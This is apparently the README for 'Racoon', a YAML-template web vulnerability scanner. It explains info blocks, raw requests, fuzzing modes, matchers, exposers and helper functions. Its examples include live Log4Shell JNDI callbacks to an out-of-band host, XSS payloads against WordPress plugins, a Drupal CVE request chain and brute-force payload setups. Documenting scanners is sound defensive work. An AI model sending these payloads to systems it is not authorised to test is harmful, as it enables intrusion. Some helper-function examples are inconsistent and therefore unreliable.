# Racoon template

<p id="menu"> </p>

## I. <a href="#introduction">Introduction</a>
## II. <a href="#components">Template Components</a>
1. <a href="#infor_block"> Info block </a>
2. <a href="#request_block">Requests block </a>
  
    a. <a href="#request_block"> Raw request </a>
  
    b. <a href="#fuzzing"> Fuzzing module </a>
  
    c. <a href="#operator"> Operator </a>

    - <a href="#operator"> Matcher </a>
    - <a href="#exposer">Exposer </a>
    - <a href="#helper">Helper Functions </a>

---
<p id="introduction"> </p>

```
██████╗  █████╗  ██████╗ ██████╗  ██████╗ ███╗   ██╗
██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔═══██╗████╗  ██║
██████╔╝███████║██║     ██║   ██║██║   ██║██╔██╗ ██║
██╔══██╗██╔══██║██║     ██║   ██║██║   ██║██║╚██╗██║
██║  ██║██║  ██║╚██████╗╚██████╔╝╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
```
                                                    
## I. **Introduction**
Raccoon is based on the perception of using YAML template file as the input for sent request, receive and process data from response. One of the main strength of our tool is customizable template. A knowledge user can create their own template suitable with their need. Those template are written by YAML because this language has a simple and clean syntax and very human-readable.

<p id="components"> </p>

## II. Template Components

<p id="infor_block"> </p>

>### 1. **Info block**
   
Info block provides some basic data fields like: id, name, author, severity, description, remediation, tags,... Info block is dynamic fields, user can add their own fields to provide more information about current template. 
Each template has a unique ID for identifier. ID must not contain spaces and another special character. In addition, templates are also classified by many other attributes, user can classify their templates by using **classification** field. In the example below, template CVE-2021-44228 is classified by four attributes are specified under  **classification**. 
Another important field is **recommendation**, users can suggest a few important suggestions to improve security and limit vulnerabilities for those web applications.

Example:

```
info:
  id: CVE-2021-44228
  name: Apache Log4j2 Remote Code Injection
  author: Hung, Dat, Danh, Hoa
  severity: critical
  description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
  recommendation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).
  reference:
    - https://logging.apache.org/log4j/2.x/security.html
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
    - https://www.lunasec.io/docs/blog/log4j-zero-day/
    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
  tags: cve,cve2021,rce,log4j
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.00
    cve-id: CVE-2021-44228
    cwe-id: CWE-502

```
<a href="#menu"> Back to main menu </a>

<p id="request_block"> </p>

> ### 2. **Request block**
>> **a. Raw request**:
Raw request is the original request that will be sent to retrieve data from web server. Multiple requests can be made from only one single template. Requests block specifies the start of the requests for the template.


```
requests:
```

**Example of raw request**:

```
GET /success.txt?ipv6 HTTP/1.1
Host: detectportal.firefox.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Pragma: no-cache
Cache-Control: no-cache
```


#### **Method**
<h1 id="test"></h1>
Those request method can be GET, POST, PUT, DELETE.

```
requests:
  - request:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_test_cookie=WP%20Cookie%20check

        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

      - |
        GET /wp-admin/admin.php?page=my-sticky-elements-leads&search-contact=xxxx%22%3E%3Cimg+src+onerror%3Dalert%28%60document.domain%60%29+x HTTP/1.1
        Host: {{Hostname}}

    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<img src onerror=alert(`document.domain`) x">'

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
```

**Redirect**

---

This field decides whether current requests can be redirect or not. By default, redirects are not allowed(it brings false value). However, if user want to redirect, it can be turn on with **redirect: true**.

**Example:**
```
requests:
  - raw:
      - |
        GET /?q={{url_encode("{{userid}}")}}%2Fcancel HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /?q=file%2Fajax%2Factions%2Fcancel%2F%23options%2Fpath%2F{{form_build_id}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        form_build_id={{form_build_id}}

    cookie-reuse: true
    redirect: true         #Using redirect
    matchers:
      - type: word
        words:
          - 'CVE-2018-7602-POC'
```

**Path**

---
When the user enters one or more paths, they are separated into their own components, replaced with the variables in **raw request** field to form a complete request and send it to the web server.

**Example of using Path:**

>**Request in template**
```
requests:
  - request:
    - |
      GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
      Host: {{Hostname}}
```

>**URL is provided by user**:

```
https://103.90.225.135:8000
```

>**Request will be sent**

```
GET /?x=%24%7Bjndi%3Aldap%3A%2F%2F%24%7BhostName%7D.uri.jrdtt2i7gbs7wp2h0oxs0efwqcqr0d3gn.interact.sh%2Fa%7D HTTP/1.1
Host: 103.90.225.135:8000
User-Agent: python-requests/2.27.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```

Those variables start with *{{* and end with *}}*, case-sensitive.

**Example of raw request is declared in the template**:

```
requests:
  - request:
      - |
        GET /dvwa?username={{users}}&passwd={{passwords}}&email={{emails}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: {{users}}{{passwords}}&email={{emails}}

        username={{users}}{{Port}}&passwd={{passwords}}&email={{emails}}
```

**Path Variables:**

```
Sample URL: https://testpage.com:8081/login/login.php

{{BaseURL}}: https://testpage.com:8081/login/login.php

{{RootURL}}: https://testpage.com:8081

{{Hostname}}: testpage.com:8081

{{Host}}: testpage.com

{{Port}}: 8081

{{Path}}: /login

{{Scheme}}: https

{{FullPath}}: /login/login.php
```

**Session**

---

By default, cookies will not be persisted in the same session, each request will generate a different cookie. To allow cookies to be remained within the same session user can use this field below.

**cookie: true** 

```
requests:
  - request:
    - |
      POST /wp-login.php HTTP/1.1
      Host: {{Hostname}}
      Origin: {{RootURL}}
      Content-Type: application/x-www-form-urlencoded
      Cookie: wordpress_test_cookie=WP%20Cookie%20check

      log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    - |
      GET /wp-admin/admin.php?page=domain-check-profile&domain=test.foo<script>alert(document.domain)</script> HTTP/1.1
      Host: {{Hostname}}

    cookie: true
    matchersCondition: and
```

**Thread:**
User can specify the number of requests to be sent simultaneously using

*thread: \<number>*

```
thread: 10            # 10 request will be sent simultaneously
scanMode: pitchfork
stopAtFirstMatch: false
matchers:
  - type: word
    part: interactsh_protocol  # Confirms the DNS Interaction
    word:
      - "dns"
```

**Muiltiple Requests Condition**

---

Muiltiple Requests Condition is used when user want to check for complex condition between multiple requests. 
The matcher can be initialized by adding *multipleRequests: true*.
Look at an example below to understand more about the declarations.

```
requests:
  - request:
      - |
        PUT {{BaseURL}}/v1/kv/{{randstr}} HTTP/1.1
        Host: {{Hostname}}

        <!DOCTYPE html><script>alert(document.domain)</script>

      - |
        GET {{BaseURL}}/v1/kv/{{randstr}}%3Fraw HTTP/1.1
        Host: {{Hostname}}

    requestCondition: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "text/html"

      - type: word
        part: body_2
        words:
          - "<!DOCTYPE html><script>alert(document.domain)</script>"
```

<a href="#menu"> Back to main menu </a>

<p id="fuzzing"></p>

>> **b. Fuzzing**:
---
Racoon supports running various type of payloads in multiple format. User can perform batteringram, pitchfork and clusterbomb attacks depends on their need. Those wordlists for these attacks needs to be defined during the request definition under the payloads field. 

Scan mode:
- batteringram:
  This uses a single set of payload, iterates through it and places the same payload value in all positions.
- pitchfork:
  This use multiple payload set. It loops through all payload sets at the same time and places each payload in each position respectively.
- clusterbomb:
  This use multiple payload set The clusterbomb attack tries all different combinations of payload like **pitchfork**. But when it loops through the payload sets, it tries all combinations.
  ==> This attack type is useful for brute-force attack..

User can declare value for each payload parameter directly or through files. 

```
payloads:
  username:
    - admin
  password:
    - axis2           #declare directly
  email:
    - "C:\Users\Admin\Desktop\emails-list.txt"          #declare through file
  scanMode: pitchfork
```

>> **c. Operator**

<p id="operator"> </p>

### **Matcher**:

---

This field contains different type of comparisons to support analysis responses in any case. Basically, there are 5 type of matchers: status, word, regex, helper, time.

In real case, Word and Regex matchers can be configured later depend on user's needs.
*helper* matcher can be used in combination of many complex expressions with helper functions to perform matching process.

*time* for response time.

```
matchers:
  - type: helper
    helper:
      - 'status_code_2 == 200'
      - 'contains(body_1, "htmoffice operate")'
      - 'contains(body_2, "Windows IP")'
    condition: and
```


**condition:** By default, it has value OR. User can decide it's value later. This option allows multiple value of each matcher's type can be declared in a single matcher. In the example above, *condition* has a value and, that mean three helper functions in this matcher must be satisfied.

**exclusion matcher** This field is used when user want to find a match with an exclusions. By default, it has value *false*. In the example below, when **exclusion** condition is declared with value *true*, it will return all the results that not having **application/json** in the response header.

```
matchers:
  - type: word
    part: header
    words:
      - "application/json"
    exclusion: true
```

**Multiple Matchers**

**Stop when meeting the first match**

In the case of using multiple requests or matchers, this field is used to stop the program from sending requests if any matcher is satisfied. It is disabled by default.

Syntax: *FirstMatchStop: true*

```
requests:
  - request:
      - |
        GET /wp-admin/admin-ajax.php?action={{md5(replace('http://HOST/-redux','HOST',Hostname))}} HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

      - |
        GET /wp-admin/admin-ajax.php?action={{md5(replace('https://HOST/-redux','HOST',Hostname))}} HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "len(body)<50"

      - type: regex
        name: meme
        regex:
          - '[a-f0-9]{32}'
        part: body

      - type: status
        status:
          - 200
```

**Multiple Matcher condition:**

---

When multiple matchers are used, the condition by default is OR. User can change the value to AND in case of they want the result will be return if all matchers are satisfied.
*multipleMatcher: and*

```
multipleMatcher: and
matchers:
  - type: status
    status:
      - 200

  - type: word
    part: body
    words:
      - '"name":"admin"'
      - '"admin":true'
    condition: and

```
<a href="#menu"> Back to main menu </a>



### **Exposer**:

---
Exposer can be used to extract and display results from the match of the response handler.

Our tool support four type of exposers:
- regex - extract data from response based on a Regular Expression
- kval 	- extract key: value/key=value formatted data from Response Header/Cookie.
- xpath - extract xpath based data from HTML Response
Example exposer for HTTP Response body using regex.

```
exposer:
  - type: regex
    part: body
    group: 1
    regex:
      - '"version": "([0-9.]+)"'
```

kval example to extract content-type header from HTTP Response.

```
exposer:
  - type: kval
    part: header
    kval:
      - server
```

In real case, content-type will be replaced with content_type because kval exposer does not accept dash (-) as input.


A xpath exposer can be used to extract value from HTML response. User can specify where to extract data with attribute field. In this example below, user want to extract value of *value* attribute from response, so that the syntax will be **attribute: value**.

```
exposer:
  - type: xpath
    name: VS
    interior: true
    attribute: value
    xpath:
      - "/html/body/form/div/input[@id='__VIEWSTATE']"
```

**Dynamic Exposer**

---

Another type of exposer is Dynamic exposer. It can be used to capture values after performing the analysis response. If user want to use that exposer as a dynamic variable *interior: true* come into play (by default, it has the value false). This field is also used to prevent the values from being printed to the screen.

```
exposer:
  - type: regex
    name: windows_working_path
    interior: true
    group: 1
    regex:
      - ".?.?\\\\.*\\\\showenv"
```
In this example above, the value matched the regex field is going to be stored in the variable named *windows_working_path* and if user want to use that variable later, *interior: true* must be placed in exposers field.
In case of multiple result of matcher are returned, an optional variable *group* can be use to grab those value more accurately as same as getting the value of an element from the array.

```
group: 0 for full match (by default are not specified)
group: 1 for first match 
group: 2 for second match
...
And so on.
```

**Out-of-band Scanning**

---

Racoon use the interact.sh for OOB based scanning.

**Interactsh Variable**

---

**{{interactUrl}}** placeholder can be used in both http and https requests.

Each request is provided each unique interact.sh URLs.

```
- request:
      - |
        GET /?x=${jndi:ldap://${hostName}.uri.{{interactUrl}}/a} HTTP/1.1
        Host: {{Hostname}}
```

**Interactsh Matchers**

---

Interactsh interactions can be used with word, regex or helper matcher/exposer

> interact_protocol: dns, http or smtp. 
```
matchers:
  - type: word
    part: interact_protocol
    words:
      - "dns"
```

> interact_req: the request that the interact.sh server received
```
exposer:
  - type: regex
    part: interact_req
    group: 1
    regex:
      - 'GET \/([a-z-]+) HTTP'
```
>interact_res: the response that the interact.sh server sent to the client

<a href="#menu"> Back to main menu </a>

<p id="helper"> </p>

### **Helper Function**:

---

|Function |Description |Example |
|--- | --- | ---|
|base64(argument) [string] |Encode a given string to base64| base64("Hello") ==> SGVsbG8gd29ybGQ=
|base64_decode(argument) [string]|Decode a given base64 to string| base64_decode("SGVsbG8gd29ybGQ=") ==> "Hello world"|
|concat(arguments_1, arguments_2, arguments_3,...) [string, string, string,...] |Concatenates the given arguments to string |concat("Hello", " ", "world") ==> "Hello world"|
|contains(argument_1, argument_2) [string, string] |Check if a argument_1 contains argument_2 | contains("Hello", "He") ==> true|
|html_escape(argument) [string]| HTML escapes the given input string|html_escape("\<p>Hello world\</p>") ==> \<p>Hello world\</p>|
|html_unescape(argument) [string] |HTML escapes the given input string| html_unescape("\&lt;body\&gt;test\&lt;/body\&gt;") ==> "test"|
|len(argument) [string]| Return the length of the input| len("test") ==> 4|
|regex(pattern, argument) [string, string]| Check if a string contains the specified search pattern|regex("H([a-z]+)o", "Hello") ==> true |
|remove_bad_chars(argument_1, argument_2) [string, string] | Remove the argument_2 from argument_1| remove_bad_chars("Hello", "lo") ==> "Hel"|
|repeat(argument_1, argument_2) [string, int] | Repeat the given string argument_1 with argument_2 times| repeat("He", 5) ==> HeHeHeHeHe |
|replace(given_string, old_string, new_string) [string, string, string]| Replace old_string with new_string in the given_string [string, string, string] | replace("Hello", "He", "Ha") ==> Hallo|
|replace_regex(given_string, regex, new_string) [string, string, string] | Replace old_string(matching the given regex) with old_string | replace_regex("tes0123t", "(\\d+)", "") ==> test|
|reverse(string) [string] | Reverse the given input string| reverse("Hello") ==> olleH|
|to_lower(string) [string]| Transforms the given string into lowercase characters |to_lower("HELLO") ==> hello|
|to_lower("HELLO") [string]| Transforms the given string into uppercase characters| to_upper("hello") // HELLO|
|trim(given_string, cut_string) [string, string] | Remove all of each character of cut_string from given_string| trim("xyTestxyxy", "xy") ==> "Test"|
|trim_space(given_string) [string, string] | Remove all the space in the given_string| trim_space("Hello   world     ") ==> "Hello world"|
|trim_left(given_string, cut_string) [string, string] | Remove all of each character of cut_string from given_string all about the left| trim_left("xyTestxyxy", "xy") ==> "Testxy"|
|trim_right(given_string, cut_string) [string, string] | Remove all of each character of cut_string from given_string in the front| trim_prefix("xyTestxyxy", "xy") ==> "Testxyxy"|
|trim_suffix(input, suffix string) [string, string] | Returns given_string without the supplied suffix string | trim_suffix("xxxxTestxx", "xx") ==> "xxxxTest"|
|trim_prefix(given_string, cut_string) [string, string] | Returns given_string without the supplied trim_prefix string | trim_prefix("xyTestxyxy", "xy") ==> "Testxyxy"|
|url_decode(given_string) [string] | URL decodes the given_string| url_decode("https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dpentest") ==> "https://www.google.com/search?q=pentest" |
|url_encode(input string) [string] | URL encodes the given_string| url_encode("https://www.google.com/search?q=pentest") ==> "https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dpentest" |
<a href="#menu"> Back to main menu </a>
